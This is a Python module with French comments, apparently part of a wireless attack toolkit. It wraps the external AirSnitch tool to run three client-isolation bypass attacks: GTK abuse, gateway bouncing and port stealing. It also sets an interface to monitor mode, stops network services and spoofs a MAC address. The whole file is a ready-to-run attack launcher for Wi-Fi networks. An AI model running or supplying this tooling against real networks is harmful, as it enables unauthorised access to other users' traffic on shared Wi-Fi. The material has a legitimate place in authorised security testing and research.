# app/attacks/airsnitch_attack.py
import os
import sys

from app.config import (
    Colors, cprint, run, ask, list_interfaces, is_root, iface_exists,
    AIRSNITCH_DIR,
)


def airsnitch_script():
    """Chemin absolu vers airsnitch.py (outil externe)."""
    return os.path.join(AIRSNITCH_DIR,"airsnitch", "research", "airsnitch.py")


def check_airsnitch_available():
    """Vérifie que l'outil airsnitch.py est présent."""
    script = airsnitch_script()
    if not os.path.isfile(script):
        print(f"[-] Outil AirSnitch introuvable : {script}")
        print(f"[i] Clone le dépôt dans : {AIRSNITCH_DIR}")
        print(f"    git clone <repo-airsnitch> {AIRSNITCH_DIR}")
        print("[i] Puis lance son setup (setup.sh, build.sh, pysetup.sh) une fois.")
        return False
    if not os.access(script, os.X_OK):
        print("[i] airsnitch.py n'est pas exécutable, ajout du bit +x...")
        os.chmod(script, 0o755)
    return True


def setup_airsnitch():
    """Exécute setup.sh / build.sh / pysetup.sh du dépôt externe (une fois)."""
    print("[*] Setup de l'outil AirSnitch (compilation + venv)...")
    root = AIRSNITCH_DIR
    research = os.path.join(root, "research")

    scripts = [
        (root, "setup.sh"),
        (research, "build.sh"),
        (research, "pysetup.sh"),
    ]
    for folder, name in scripts:
        path = os.path.join(folder, name)
        if not os.path.isfile(path):
            print(f"[i] {name} absent, étape ignorée.")
            continue
        print(f"[*] Exécution : {path}")
        if run(f"cd {folder} && bash {name}", capture=False) != 0:
            print(f"[-] {name} a échoué.")
            return False
    print("[+] Setup AirSnitch terminé.")
    return True


def configure_interfaces(mon_iface, tgt_iface):
    """Prépare l'interface monitor et la cible (MAC aléatoire)."""
    print(f"[*] Configuration : attaque={mon_iface}, cible={tgt_iface}")
    if not iface_exists(mon_iface):
        print(f"[-] Interface {mon_iface} inexistante.")
        return False
    if not iface_exists(tgt_iface):
        print(f"[-] Interface {tgt_iface} inexistante.")
        return False

    print("[*] rfkill unblock all...")
    run("rfkill unblock all", capture=False)

    print("[*] Arrêt NetworkManager / wpa_supplicant...")
    run("systemctl stop NetworkManager", capture=False)
    run("systemctl stop wpa_supplicant", capture=False)
    run("pkill -f wpa_supplicant", capture=False)

    print(f"[*] Mode monitor sur {mon_iface}...")
    run(f"ip link set {mon_iface} down", capture=False)
    run(f"iw dev {mon_iface} set type monitor", capture=False)
    run(f"ip link set {mon_iface} up", capture=False)

    print(f"[*] MAC aléatoire sur {tgt_iface}...")
    run(f"macchanger -r {tgt_iface}", capture=False)

    print("[+] Interfaces configurées.")
    return True


def run_attack(choice, mon_iface, tgt_iface, server_ip=None):
    """Exécute une des 3 attaques AirSnitch."""
    script = airsnitch_script()
    research = os.path.dirname(script)

    # Activation du venv du dépôt externe si présent
    venv_activate = os.path.join(research, "venv", "bin", "activate")
    prefix = f"cd {research} && "
    if os.path.isfile(venv_activate):
        prefix += f"source {venv_activate} && "

    if choice == "1":
        print("[*] Attaque : GTK Abuse")
        cmd = (f"./airsnitch.py {mon_iface} --check-gtk-shared {tgt_iface} "
               f"--no-ssid-check --other-bss")
    elif choice == "2":
        print("[*] Attaque : Gateway Bouncing")
        cmd = (f"./airsnitch.py {mon_iface} --c2c-ip {tgt_iface} "
               f"--no-ssid-check --other-bss")
    elif choice == "3":
        print("[*] Attaque : Port Stealing")
        if not server_ip:
            print("[-] Adresse serveur requise pour Port Stealing.")
            return False
        cmd = (f"./airsnitch.py {mon_iface} --c2c-port-steal {tgt_iface} "
               f"--no-ssid-check --other-bss --server {server_ip}")
    else:
        print(f"[-] Choix invalide : {choice}")
        return False

    print(f"[*] Commande : {cmd}")
    return run(prefix + cmd, capture=False) == 0


def main():
    if not is_root():
        cprint("[-] Root requis.", Colors.RED, bold=True)
        sys.exit(1)

    cprint("AirSnitch — contournement d'isolation client", Colors.GREEN, bold=True)

    # 1. Vérifier l'outil
    if not check_airsnitch_available():
        if input("Lancer le setup AirSnitch ? (o/n) : ").strip().lower() == "o":
            if not setup_airsnitch():
                sys.exit(1)
        else:
            sys.exit(1)

    # 2. Choix de l'attaque
    print("\nAttaques disponibles :")
    print("  1. GTK Abuse Attack")
    print("  2. Gateway Bouncing")
    print("  3. Port Stealing")
    print("  0. Retour")
    choice = ask("Votre choix", default="1",
                 validator=lambda x: x in ("0", "1", "2", "3"))
    if choice == "0":
        return

    # 3. Interfaces
    list_interfaces()
    mon_iface = ask("Interface d'attaque (mode monitor)", default="wlan0",
                    validator=iface_exists)
    tgt_iface = ask("Interface cible", default="wlan5",
                    validator=iface_exists)

    # 4. Serveur (uniquement Port Stealing)
    server_ip = None
    if choice == "3":
        server_ip = ask("Adresse serveur", default="192.168.10.1")

    # 5. Récap
    print("\nConfiguration :")
    print(f"  Interface attaque : {mon_iface}")
    print(f"  Interface cible   : {tgt_iface}")
    if server_ip:
        print(f"  Serveur           : {server_ip}")

    if input("\nConfigurer les interfaces maintenant ? (o/n) : ").strip().lower() == "o":
        if not configure_interfaces(mon_iface, tgt_iface):
            sys.exit(1)

    # 6. Exécution
    ok = run_attack(choice, mon_iface, tgt_iface, server_ip)
    sys.exit(0 if ok else 1)


if __name__ == "__main__":
    main()